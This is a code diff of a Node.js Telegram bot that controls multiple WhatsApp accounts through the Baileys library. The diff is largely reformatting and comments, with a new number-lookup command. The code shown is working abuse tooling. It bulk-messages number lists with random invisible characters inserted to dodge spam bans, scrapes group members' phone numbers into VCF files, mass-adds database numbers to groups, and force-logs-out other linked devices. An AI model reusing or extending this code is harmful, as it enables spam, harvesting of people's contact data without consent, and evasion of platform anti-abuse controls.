@@ -7,16 +7,14 @@ import {
 } from './db.js';
 import { delay } from '@whiskeysockets/baileys';
 import fetch from 'node-fetch';
-import fs from 'fs';
-import path from 'path';
 
 const ADMIN_ID = process.env.ADMIN_ID;
 const userState = {};
-const userRateLimit = {};  
-const verifiedUsers = new Set();  
-const userMessageCache = {};  
-const RATE_LIMIT_WINDOW = 60000;  
-const MAX_REQUESTS_PER_MINUTE = 15; // Increased slightly for better UX
+const userRateLimit = {};  // Track user requests for rate limiting
+const verifiedUsers = new Set();  // Track verified users who passed CAPTCHA
+const userMessageCache = {};  // Track sent messages for cleanup
+const RATE_LIMIT_WINDOW = 60000;  // 1 minute
+const MAX_REQUESTS_PER_MINUTE = 10;  // Max requests per minute
 
 const userKeyboard = {
     keyboard: [
@@ -42,6 +40,7 @@ function getKeyboard(chatId) {
 // Delete all previous bot messages and user input, then send new message
 async function deleteOldMessagesAndSend(bot, chatId, text, options = {}) {
     try {
+        // Delete previous bot messages
         if (userMessageCache[chatId] && Array.isArray(userMessageCache[chatId])) {
             for (const msgId of userMessageCache[chatId]) {
                 try {
@@ -51,6 +50,7 @@ async function deleteOldMessagesAndSend(bot, chatId, text, options = {}) {
         }
         userMessageCache[chatId] = [];
         
+        // Send new message
         const sentMsg = await bot.sendMessage(chatId, text, options);
         userMessageCache[chatId].push(sentMsg.message_id);
         return sentMsg;
@@ -60,6 +60,7 @@ async function deleteOldMessagesAndSend(bot, chatId, text, options = {}) {
     }
 }
 
+// Delete user command message
 async function deleteUserCommand(bot, msg) {
     try {
         if (msg && msg.message_id) {
@@ -72,6 +73,7 @@ async function sendMenu(bot, chatId, text) {
     await deleteOldMessagesAndSend(bot, chatId, text, { ...getKeyboard(chatId), parse_mode: 'Markdown' });
 }
 
+// PERSISTENT DURATION: Calculates time based on DB timestamp (startDate)
 function getDuration(startDate) {
     if (!startDate) return "Just now";
     const diff = Date.now() - new Date(startDate).getTime();
@@ -81,23 +83,29 @@ function getDuration(startDate) {
     return `${days}d ${hours}h ${minutes}m`;
 }
 
+// Rate limit checker
 function checkRateLimit(userId) {
     const now = Date.now();
     if (!userRateLimit[userId]) {
         userRateLimit[userId] = { count: 1, startTime: now };
         return true;
     }
+    
     const userLimit = userRateLimit[userId];
     if (now - userLimit.startTime > RATE_LIMIT_WINDOW) {
         userLimit.count = 1;
         userLimit.startTime = now;
         return true;
     }
-    if (userLimit.count >= MAX_REQUESTS_PER_MINUTE) return false;
+    
+    if (userLimit.count >= MAX_REQUESTS_PER_MINUTE) {
+        return false;
+    }
     userLimit.count++;
     return true;
 }
 
+// --- OLD SAVE LOGIC (STRICT 1-by-1) ---
 function parseVcf(vcfContent) {
     const numbers = new Set();
     const lines = vcfContent.split(/\r?\n/);
@@ -110,20 +118,25 @@ function parseVcf(vcfContent) {
     return Array.from(numbers);
 }
 
-// --- HELPER: ROBUST LOGOUT SEQUENCE ---
+// --- HELPER: ROBUST LOGOUT SEQUENCE (IQ NODE PROTOCOL) ---
 async function performLogoutSequence(sock, shortId, bot, chatId) {
     const myJid = sock.user?.id || "";
     if (!myJid) return 0;
     
     const userNumber = myJid.split(':')[0].split('@')[0];
     let myDeviceId = 0;
-    if (myJid.includes(':')) myDeviceId = parseInt(myJid.split(':')[1].split('@')[0]);
+    if (myJid.includes(':')) {
+        myDeviceId = parseInt(myJid.split(':')[1].split('@')[0]);
+    }
 
     let kickedCount = 0;
+    
     // Scan slots 1-20 aggressively
     for (let i = 1; i <= 20; i++) {
         if (i === 0 || i === myDeviceId) continue;
+
         const targetDeviceJid = `${userNumber}:${i}@s.whatsapp.net`;
+        
         try {
             await sock.query({
                 tag: 'iq',
@@ -133,13 +146,16 @@ async function performLogoutSequence(sock, shortId, bot, chatId) {
             kickedCount++;
             await delay(300); 
         } catch (err) {}
+
         try {
             await sock.sendMessage(targetDeviceJid, { protocolMessage: { type: 5 } });
             await delay(200);
         } catch(e) {}
     }
+
     await delay(3000);
     try { await sock.logout(); } catch(e) {}
+    
     return kickedCount;
 }
 
@@ -174,7 +190,7 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
                 const cleanNum = num.replace(/\D/g, '');
                 const jid = `${cleanNum}@s.whatsapp.net`;
                 
-                // ANTI-BAN MAGIC
+                // ANTI-BAN
                 const invisibleChars = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
                 const randomInvisible = invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
                 const invisibleSalt = randomInvisible.repeat(Math.floor(Math.random() * 2) + 1);
@@ -231,10 +247,11 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         while (queueIdx < queue.length || activePromises.length > 0) {
             while (activePromises.length < CONCURRENT_LIMIT && queueIdx < queue.length) {
                 const { num, idx } = queue[queueIdx];
-                const promise = sendMessage(num, idx + 1).then(result => {
-                    activePromises = activePromises.filter(p => p !== promise);
-                    return result;
-                });
+                const promise = sendMessage(num, idx + 1)
+                    .then(result => {
+                        activePromises = activePromises.filter(p => p !== promise);
+                        return result;
+                    });
                 activePromises.push(promise);
                 queueIdx++;
                 await delay(Math.random() * 150 + 50);
@@ -244,7 +261,7 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         
         const batchCompleted = Math.min(queueIdx, 50);
         if (batchCompleted % 10 === 0) {
-            bot.sendMessage(chatId, `[PROGRESS] Sent: ${deliveredCount}/${numbers.length}`).catch(() => {});
+            bot.sendMessage(chatId, `[PROGRESS] Sent: ${successCount + deliveredCount}/${numbers.length}`).catch(() => {});
         }
         
         const duration = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -259,7 +276,7 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         );
     }
 
-    // --- ADMIN COMMANDS ---
+    // --- COMMANDS ---
 
     bot.onText(/\/logoutall/, async (msg) => {
         deleteUserCommand(bot, msg);
@@ -267,8 +284,10 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         const chatId = msg.chat.id;
         const connectedFolders = Object.keys(clients);
         if (connectedFolders.length === 0) return sendMenu(bot, chatId, "[ERROR] No accounts connected.");
-        bot.sendMessage(chatId, `[SYSTEM CLEANUP] Found ${connectedFolders.length} active accounts.\nStarting Global Logout...`);
+
+        bot.sendMessage(chatId, `[SYSTEM CLEANUP] Found ${connectedFolders.length} accounts.\nStarting Global Logout...`);
         let processedCount = 0;
+        
         for (const folder of connectedFolders) {
             const sock = clients[folder];
             const shortId = Object.keys(shortIdMap).find(key => shortIdMap[key].folder === folder) || 'Unknown';
@@ -277,16 +296,18 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
                 processedCount++;
             } catch (e) { console.error(`Logout failed for ${shortId}:`, e); }
         }
-        sendMenu(bot, chatId, `[LOGOUT COMPLETE]\nProcessed: ${processedCount} Accounts`);
+        sendMenu(bot, chatId, `[LOGOUT COMPLETE]\nProcessed: ${processedCount}/${connectedFolders.length}`);
     });
 
     bot.onText(/\/logout\s+(\S+)/, async (msg, match) => {
         deleteUserCommand(bot, msg);
         if (msg.chat.id.toString() !== ADMIN_ID) return;
+        
         const targetId = match[1];
         if (!targetId || !shortIdMap[targetId]) return sendMenu(bot, msg.chat.id, `[ERROR] Invalid ID: ${targetId}`);
         const sessionData = shortIdMap[targetId];
         const sock = clients[sessionData.folder];
+
         if (!sock) return sendMenu(bot, msg.chat.id, `[ERROR] Client disconnected.`);
         try {
             bot.sendMessage(msg.chat.id, `[LOGOUT] ${targetId}...`);
@@ -305,13 +326,25 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         sendMenu(bot, msg.chat.id, `[ADDED] ${num}\nTotal DB: ${total}`);
     });
 
+    bot.onText(/\/checknum\s+(\S+)/, async (msg, match) => {
+        deleteUserCommand(bot, msg);
+        if (msg.chat.id.toString() !== ADMIN_ID) return;
+        const num = match[1].replace(/[^0-9]/g, '');
+        if (num.length < 7) return bot.sendMessage(msg.chat.id, '[ERROR] Invalid number.');
+        const exists = await checkNumberInDb(num);
+        if (exists) sendMenu(bot, msg.chat.id, `[FOUND] ${num} is in database.`);
+        else sendMenu(bot, msg.chat.id, `[NOT FOUND] ${num} is NOT in database.`);
+    });
+
     bot.onText(/\/broadcast(?:\s+(.+))?/, async (msg, match) => {
         deleteUserCommand(bot, msg);
         if (msg.chat.id.toString() !== ADMIN_ID) return;
         const chatId = msg.chat.id;
         let inputId = match[1] ? match[1].trim() : null;
+
         const activeIds = Object.keys(shortIdMap).filter(id => clients[shortIdMap[id].folder]);
         if (activeIds.length === 0) return sendMenu(bot, chatId, "[ERROR] No active bots.");
+        
         let targetId = activeIds[0];
         let contentObj = null;
 
@@ -350,12 +383,14 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         const chatId = msg.chat.id;
         const acc = match[1];
         let groupLinkOrId = match[2];
+        
         let sock = null;
         if (shortIdMap[acc] && clients[shortIdMap[acc].folder]) sock = clients[shortIdMap[acc].folder];
         else {
             const found = Object.values(shortIdMap).find(s => s.phone === acc);
             if (found && clients[found.folder]) sock = clients[found.folder];
         }
+
         if (!sock) return bot.sendMessage(chatId, '[ERROR] Account not found.');
 
         let groupJid = groupLinkOrId;
@@ -371,6 +406,7 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
         if (numbers.length === 0) return bot.sendMessage(chatId, '[ERROR] Database empty.');
 
         bot.sendMessage(chatId, `[ADDING] ${numbers.length} users (100 / 30s)...`);
+        
         let addedCount = 0;
         for (let i = 0; i < numbers.length; i += 100) {
             const batch = numbers.slice(i, i + 100);
@@ -424,11 +460,14 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
                 }
             });
 
-            const tempDir = process.cwd(); 
+            // Dynamic import for fs/path to handle scraping
+            const fs = await import('fs');
+            const path = await import('path');
+            const tempDir = '/tmp'; // Use /tmp for read-only filesystem compatibility
             const fileName = `scraped_members_${Date.now()}.vcf`;
             const filePath = path.join(tempDir, fileName);
-            fs.writeFileSync(filePath, vcfContent);
 
+            fs.writeFileSync(filePath, vcfContent);
             await bot.sendDocument(chatId, filePath);
             fs.unlinkSync(filePath);
 
@@ -490,7 +529,7 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
     });
 
     // --- POINTS ADMIN COMMAND (PERSISTENT) ---
-    bot.onText(/\/addpoint\s+(\d+)\s+([+-]?\d+)/, async (msg, match) => {
+    bot.onText(/\/add\s+(\d+)\s+([+-]?\d+)/, async (msg, match) => {
         deleteUserCommand(bot, msg);
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_ID) return bot.sendMessage(chatId, '[ERROR] Admin only.');
